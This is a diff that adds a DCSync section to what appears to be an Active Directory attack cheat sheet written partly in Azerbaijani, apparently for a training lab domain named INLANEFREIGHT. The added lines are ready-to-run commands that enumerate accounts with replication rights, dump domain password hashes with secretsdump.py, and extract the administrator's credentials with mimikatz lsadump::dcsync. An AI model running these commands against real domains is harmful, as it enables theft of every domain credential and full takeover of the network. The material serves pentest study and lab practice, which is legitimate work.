@@ -479,6 +479,25 @@ function Get-ObjectByRID {
 Get-ObjectByRID -RID 1105
 ```
 
+# DSync
+```
+# Reversible Encryption Aktiv Olan İstifadəçiləri Tapmaq
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=128)" | Select-Object samaccountname, useraccountcontrol, memberof
+
+# Domendə Kimlərin DSync hüququna malik olduqlarını axtaraq.
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    $_.ObjectAceType -match "DS-Replication-Get-Changes" -and
+    $_.AccessControlType -eq "Allow"
+} | Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights | ft -AutoSize
+
+# Linux
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+# Windows
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+.\mimikatz.exe
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
 
 
 
